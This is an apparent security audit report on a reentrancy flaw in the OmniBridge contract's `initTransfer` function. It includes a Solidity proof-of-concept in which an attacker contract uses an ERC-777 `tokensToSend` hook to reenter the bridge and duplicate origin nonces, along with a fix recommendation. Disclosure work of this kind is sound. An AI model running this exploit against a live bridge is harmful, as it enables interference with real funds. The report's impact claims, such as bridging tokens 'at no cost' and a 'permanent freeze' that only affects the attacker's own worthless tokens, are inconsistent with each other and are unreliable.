### Title
Reentrancy via ERC-777 `tokensToSend` Hook Causes `currentOriginNonce` Desync, Producing Duplicate Origin Nonces and Permanent Fund Freeze — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer` increments `currentOriginNonce` at the top of the function but reads the storage variable again — not a local snapshot — when passing it to `initTransferExtension` and when emitting the `InitTransfer` event. There is no reentrancy guard. An attacker who supplies an ERC-777 token can reenter `initTransfer` inside the `tokensToSend` hook that fires during `safeTransferFrom`, causing the inner (reentrant) call to increment `currentOriginNonce` a second time. When the outer call resumes, both calls emit `InitTransfer` events carrying the same `originNonce` (N+1), while nonce N is silently skipped. On NEAR, `TransferId = (origin_chain, origin_nonce)` is the deduplication key; only one of the two transfers with nonce N+1 can ever be finalized. The other transfer's tokens are permanently locked in the EVM bridge with no recovery path.

---

### Finding Description

**Root cause — storage variable read at emission time, not at increment time** [1](#0-0) 

```solidity
currentOriginNonce += 1;          // ← nonce captured in storage as N
```

The function then performs an external token transfer that can trigger a callback: [2](#0-1) 

```solidity
IERC20(tokenAddress).safeTransferFrom(
    msg.sender,
    address(this),
    amount
);
```

After the external call returns, the function reads `currentOriginNonce` from storage again — not from a local variable — for both the extension call and the event: [3](#0-2) 

```solidity
initTransferExtension(
    msg.sender, tokenAddress,
    currentOriginNonce,   // ← storage read, not local snapshot
    ...
);
emit BridgeTypes.InitTransfer(
    msg.sender, tokenAddress,
    currentOriginNonce,   // ← storage read again
    ...
);
```

There is no `ReentrancyGuard` or `nonReentrant` modifier anywhere in `OmniBridge` or its inheritance chain (`UUPSUpgradeable`, `AccessControlUpgradeable`, `SelectivePausableUpgradable`).

**Reentrant path — ERC-777 `tokensToSend` hook**

ERC-777 tokens implement the ERC-20 interface and are therefore accepted by the `else` branch (non-bridge, non-custom-minter tokens). When `safeTransferFrom(msg.sender, address(this), amount)` is called on an ERC-777 token, the token contract calls `tokensToSend` on the `from` address (`msg.sender`) **before** completing the transfer. If `msg.sender` is an attacker-controlled contract that implements `IERC777Sender`, it can call `initTransfer` again inside `tokensToSend`.

**Execution trace**

| Step | `currentOriginNonce` | Action |
|------|---------------------|--------|
| Outer call enters | N-1 → **N** | `currentOriginNonce += 1` |
| `safeTransferFrom` fires `tokensToSend` | N | Attacker's hook executes |
| Inner (reentrant) call enters | N → **N+1** | `currentOriginNonce += 1` |
| Inner call emits `InitTransfer` | N+1 | Event with `originNonce = N+1` (legitimate token) |
| Inner call returns | N+1 | |
| Outer call resumes, calls `initTransferExtension` | N+1 | Wormhole/extension receives nonce **N+1** (wrong) |
| Outer call emits `InitTransfer` | N+1 | **Duplicate** event with `originNonce = N+1` (MalToken) |

Nonce **N** is never emitted. Nonce **N+1** appears in two separate `InitTransfer` events for two different transfers.

**`OmniBridgeWormhole` amplifies the impact**

`initTransferExtension` in `OmniBridgeWormhole` publishes a Wormhole VAA containing `originNonce`: [4](#0-3) 

Both the outer and inner calls publish a VAA with `originNonce = N+1`. Two signed VAAs exist for two different transfers, both claiming the same nonce.

**NEAR deduplication enforces permanent loss**

On NEAR, `TransferId` is `(origin_chain, origin_nonce)`: [5](#0-4) 

`add_fin_transfer` panics if the same `TransferId` is inserted twice: [6](#0-5) 

The first relayer to submit a proof for nonce N+1 succeeds. The second submission panics with `ERR_TRANSFER_ALREADY_FINALISED`. The tokens for the second transfer are permanently locked in the EVM bridge — there is no rescue function.

---

### Impact Explanation

**Permanent freezing of user funds in the EVM bridge.** The attacker controls which transfer becomes the "stuck" one. By making the outer call use a worthless self-minted ERC-777 token (MalToken) and the inner reentrant call use a legitimate token, the attacker ensures:

- The legitimate token transfer (inner call, nonce N+1) is finalized on NEAR.
- The MalToken transfer (outer call, also nonce N+1) is rejected on NEAR as a duplicate.
- MalToken is worthless, so the attacker loses nothing.
- Nonce N is permanently skipped, corrupting the bridge's nonce accounting.

Any innocent user whose transfer happens to receive nonce N+1 in a subsequent block is unaffected (they get N+2), but the attacker can repeat the attack to freeze arbitrary amounts of their own worthless tokens while successfully bridging real value — or to grief specific nonce slots.

---

### Likelihood Explanation

- ERC-777 tokens are a deployed, live standard on Ethereum mainnet (e.g., several DeFi tokens implement it).
- The bridge's `initTransfer` accepts **any** ERC-20-compatible token in the non-bridge-token path — no allowlist.
- The attacker only needs to deploy a contract implementing `IERC777Sender` and a minimal ERC-777 token; both are trivial.
- No privileged role, leaked key, or external oracle is required.
- The attack is executable in a single transaction by any unprivileged user.

---

### Recommendation

Capture `currentOriginNonce` in a local variable immediately after incrementing it, and use only the local variable for all downstream operations:

```solidity
function initTransfer(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 originNonce = currentOriginNonce;  // ← snapshot before any external call
    ...
    IERC20(tokenAddress).safeTransferFrom(msg.sender, address(this), amount);
    ...
    initTransferExtension(msg.sender, tokenAddress, originNonce, ...);
    emit BridgeTypes.InitTransfer(msg.sender, tokenAddress, originNonce, ...);
}
```

Apply the same fix to `initTransfer1155`. Additionally, add OpenZeppelin's `ReentrancyGuardUpgradeable` and mark both `initTransfer` and `initTransfer1155` with `nonReentrant` as defense-in-depth.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/utils/introspection/ERC1820Implementer.sol";

interface IOmniBridge {
    function initTransfer(
        address tokenAddress, uint128 amount, uint128 fee,
        uint128 nativeFee, string calldata recipient, string calldata message
    ) external payable;
}

contract MalToken is ERC777 {
    constructor() ERC777("Mal", "MAL", new address[](0)) {
        _mint(msg.sender, 1e18, "", "");
    }
}

contract Attacker is IERC777Sender, ERC1820Implementer {
    IOmniBridge bridge;
    address malToken;
    address legitToken;
    bool reentered;

    bytes32 constant TOKENS_SENDER_INTERFACE_HASH =
        keccak256("ERC777TokensSender");

    constructor(address _bridge, address _malToken, address _legitToken) {
        bridge = IOmniBridge(_bridge);
        malToken = _malToken;
        legitToken = _legitToken;
        // Register this contract as ERC777 sender for malToken
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24)
            .setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));
    }

    function tokensToSend(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external override {
        if (!reentered) {
            reentered = true;
            // Inner call: legitimate token, gets nonce N+1 in event
            bridge.initTransfer(legitToken, 1e18, 0, 0, "near:victim.near", "");
        }
    }

    function attack() external {
        // Outer call: MalToken, increments nonce to N, but event will emit N+1
        bridge.initTransfer(malToken, 1, 0, 0, "near:attacker.near", "");
        // Result: two InitTransfer events both with originNonce = N+1
        // Nonce N is skipped. MalToken transfer is permanently stuck on NEAR.
    }
}
```

After `attack()` executes:
- Two `InitTransfer` events are emitted, both with `originNonce = N+1`.
- The NEAR bridge finalizes the first (legitimate token) and rejects the second (MalToken) with `ERR_TRANSFER_ALREADY_FINALISED`.
- The MalToken transfer's tokens (worthless) are permanently locked in the EVM bridge.
- The attacker successfully bridges legitimate tokens at no cost. [7](#0-6) [8](#0-7) [9](#0-8)

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L381-436)
```text
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        uint256 extensionValue;
        if (tokenAddress == address(0)) {
            if (fee != 0) {
                revert InvalidFee();
            }
            extensionValue = msg.value - amount - nativeFee;
        } else {
            extensionValue = msg.value - nativeFee;
            if (customMinters[tokenAddress] != address(0)) {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    customMinters[tokenAddress],
                    amount
                );
                ICustomMinter(customMinters[tokenAddress]).burn(
                    tokenAddress,
                    amount
                );
            } else if (isBridgeToken[tokenAddress]) {
                BridgeToken(tokenAddress).burn(msg.sender, amount);
            } else {
                IERC20(tokenAddress).safeTransferFrom(
                    msg.sender,
                    address(this),
                    amount
                );
            }
        }

        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridgeWormhole.sol (L118-150)
```text
    function initTransferExtension(
        address sender,
        address tokenAddress,
        uint64 originNonce,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message,
        uint256 value
    ) internal override {
        bytes memory payload = bytes.concat(
            bytes1(uint8(MessageType.InitTransfer)),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(sender),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(tokenAddress),
            Borsh.encodeUint64(originNonce),
            Borsh.encodeUint128(amount),
            Borsh.encodeUint128(fee),
            Borsh.encodeUint128(nativeFee),
            Borsh.encodeString(recipient),
            Borsh.encodeString(message)
        );
        // slither-disable-next-line reentrancy-eth
        _wormhole.publishMessage{value: value}(
            wormholeNonce,
            payload,
            _consistencyLevel
        );

        wormholeNonce++;
    }
```

**File:** near/omni-bridge/src/lib.rs (L1471-1473)
```rust
    pub fn is_transfer_finalised(&self, transfer_id: TransferId) -> bool {
        self.finalised_transfers.contains(&transfer_id)
    }
```

**File:** near/omni-bridge/src/lib.rs (L2226-2234)
```rust
    fn add_fin_transfer(&mut self, transfer_id: &TransferId) -> NearToken {
        let storage_usage = env::storage_usage();
        require!(
            self.finalised_transfers.insert(transfer_id),
            BridgeError::TransferAlreadyFinalised.as_ref()
        );
        env::storage_byte_cost()
            .saturating_mul((env::storage_usage().saturating_sub(storage_usage)).into())
    }
```
